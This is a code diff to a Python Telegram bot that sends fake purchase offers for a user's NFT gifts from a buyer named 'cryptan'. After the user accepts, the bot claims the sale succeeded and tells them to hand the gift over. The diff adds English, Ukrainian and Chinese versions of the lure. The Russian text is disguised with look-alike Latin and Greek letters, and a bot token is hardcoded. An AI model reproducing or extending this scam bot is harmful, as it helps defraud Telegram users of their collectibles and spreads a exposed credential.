@@ -10,7 +10,7 @@ from aiogram.exceptions import TelegramRetryAfter
 
 # Настройки
 TOKEN = "9252419350:AAFEQ930iWfDMcC1bNRmOE2zmSbYK9kpj_g"
-RECIPIENT = "@crypqtan"
+RECIPIENT = "@monk"
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN)
@@ -22,6 +22,8 @@ client_user_ids = {}
 
 LOCALES = {
     "ru": {
+        "offer_text": 'Пoльзοватeль <b>cryptan</b> пρeдлагaет Bам <b>{amount} {currency_emoji}</b> зa кoллeкционный пpедмeт <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\nПpeдлοжeние дeйcтвyeт в тeчeнии 5 ч. 59 мин..',
+        "accept_text": '{success_emoji} <a href="https://t.me/nft/{slug}-{gift_num}"><b>{gift_name} #{gift_num}</b></a> <b>успешно продан!</b>\n\n<b>• Передайте покупателю для зачисления {currency_name}.</b>',
         "btn_decline": "Отклонить",
         "btn_accept": "Принять",
         "btn_transfer": "Передать",
@@ -29,6 +31,8 @@ LOCALES = {
         "flood_error": "⚠️ Временное ограничение (PEER_FLOOD). Попробуйте отправить запрос позже."
     },
     "eng": {
+        "offer_text": 'User <b>cryptan</b> offers you <b>{amount} {currency_emoji}</b> for the collectible item <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\nOffer is valid for 5 h. 59 min..',
+        "accept_text": '{success_emoji} <a href="https://t.me/nft/{slug}-{gift_num}"><b>{gift_name} #{gift_num}</b></a> <b>successfully sold!</b>\n\n<b>• Transfer to the buyer to credit {currency_name}.</b>',
         "btn_decline": "Decline",
         "btn_accept": "Accept",
         "btn_transfer": "Transfer",
@@ -36,6 +40,8 @@ LOCALES = {
         "flood_error": "⚠️ Temporary limit (PEER_FLOOD). Please try sending later."
     },
     "ukr": {
+        "offer_text": 'Користувач <b>cryptan</b> пропонує Вам <b>{amount} {currency_emoji}</b> за колекційний предмет <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\nПропозиція діє протягом 5 год. 59 хв..',
+        "accept_text": '{success_emoji} <a href="https://t.me/nft/{slug}-{gift_num}"><b>{gift_name} #{gift_num}</b></a> <b>успішно продано!</b>\n\n<b>• Передайте покупцю для зарахування {currency_name}.</b>',
         "btn_decline": "Відхилити",
         "btn_accept": "Прийняти",
         "btn_transfer": "Передати",
@@ -43,6 +49,8 @@ LOCALES = {
         "flood_error": "⚠️ Тимчасове обмеження (PEER_FLOOD). Спробуйте надіслати пізніше."
     },
     "cn": {
+        "offer_text": '用户 <b>cryptan</b> 向您出价 <b>{amount} {currency_emoji}</b> 购买收藏品 <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\n此出价有效期为 5 小时 59 分钟。',
+        "accept_text": '{success_emoji} <a href="https://t.me/nft/{slug}-{gift_num}"><b>{gift_name} #{gift_num}</b></a> <b>已成功售出！</b>\n\n<b>• 请将物品转给买家以完成 {currency_name} 的到账。</b>',
         "btn_decline": "拒绝",
         "btn_accept": "接受",
         "btn_transfer": "转移",
@@ -53,8 +61,8 @@ LOCALES = {
 
 def build_offer_text(gift_name, gift_num, amount, currency_type, lang):
     slug = gift_name.replace(" ", "")
+    loc = LOCALES.get(lang, LOCALES["ru"])
     
-    # Жесткий выбор эмодзи под валюту (Gram или Stars)
     if currency_type.lower() == "gram":
         emoji_id = "5298988357538328017"
         fallback_char = "💎"
@@ -64,10 +72,12 @@ def build_offer_text(gift_name, gift_num, amount, currency_type, lang):
 
     currency_emoji = f'<tg-emoji emoji-id="{emoji_id}">{fallback_char}</tg-emoji>'
     
-    return (
-        f'Пoльзοватeль <b>cryptan</b> пρeдлагaет Bам <b>{amount} {currency_emoji}</b> зa кoллeкционный пpедмeт '
-        f'<b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\n'
-        f'Пpeдлοжeние дeйcтвyeт в тeчeнии 5 ч. 59 мин..'
+    return loc["offer_text"].format(
+        amount=amount,
+        currency_emoji=currency_emoji,
+        slug=slug,
+        gift_name=gift_name,
+        gift_num=gift_num
     )
 
 def make_offer_keyboard(gift_name, gift_num, amount, currency_type, lang):
@@ -86,11 +96,15 @@ def make_offer_keyboard(gift_name, gift_num, amount, currency_type, lang):
 
 def build_accept_text(gift_name, gift_num, currency_name, lang):
     slug = gift_name.replace(" ", "")
+    loc = LOCALES.get(lang, LOCALES["ru"])
     success_emoji = '<tg-emoji emoji-id="5985472565508838112">🎁</tg-emoji>'
 
-    return (
-        f'{success_emoji} <a href="https://t.me/nft/{slug}-{gift_num}"><b>{gift_name} #{gift_num}</b></a> <b>успешно продан!</b>\n\n'
-        f'<b>• Передайте покупателю для зачисления {currency_name}.</b>'
+    return loc["accept_text"].format(
+        success_emoji=success_emoji,
+        slug=slug,
+        gift_name=gift_name,
+        gift_num=gift_num,
+        currency_name=currency_name
     )
 
 def make_accept_keyboard(lang):
@@ -131,7 +145,6 @@ async def handle_business_command(message: Message):
 
     text_lower = text_clean.lower()
     
-    # Строгое определение типа валюты
     if "gram" in text_lower:
         currency_type = "gram"
         currency_name = "Gram"
@@ -202,27 +215,21 @@ async def accept_offer(cb: CallbackQuery):
             link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True)
         )
         await cb.answer("✅ Предложение успешно принято!")
-    except TelegramRetryAfter as e:
-        wait_time = e.retry_after + 1
-        await asyncio.sleep(wait_time)
-        try:
-            await bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=cb.message.message_id,
-                text=text,
-                parse_mode=ParseMode.HTML,
-                reply_markup=make_accept_keyboard(lang),
-                business_connection_id=bcid,
-                link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True)
-            )
-            await cb.answer("✅ Предложение успешно принято!")
-        except Exception:
-            await cb.answer("✅ Предложение принято!", show_alert=True)
     except Exception as e:
-        if "message is not modified" in str(e) or "query is too old" in str(e):
+        error_str = str(e)
+        if "message is not modified" in error_str or "query is too old" in error_str:
+            try:
+                await bot.edit_message_reply_markup(
+                    chat_id=chat_id,
+                    message_id=cb.message.message_id,
+                    reply_markup=None,
+                    business_connection_id=bcid
+                )
+            except Exception:
+                pass
             await cb.answer("✅ Сделка уже зафиксирована!", show_alert=True)
         else:
-            logging.error(f"Accept error: {e}")
+            logging.error(f"Accept error: {error_str}")
             await cb.answer("✅ Предложение принято!", show_alert=True)
 
 @dp.callback_query(F.data.startswith("d|"))
@@ -246,7 +253,6 @@ async def sender_worker():
             text = build_offer_text(task["gift_name"], task["gift_num"], task["amount"], task["currency_type"], task["lang"])
             keyboard = make_offer_keyboard(task["gift_name"], task["gift_num"], task["amount"], task["currency_type"], task["lang"])
 
-            # Отправка без reply_to_message_id, чтобы в чате не было плашки «Удаленное сообщение»
             sent_msg = await bot.send_message(
                 chat_id=task["chat_id"],
                 text=text,
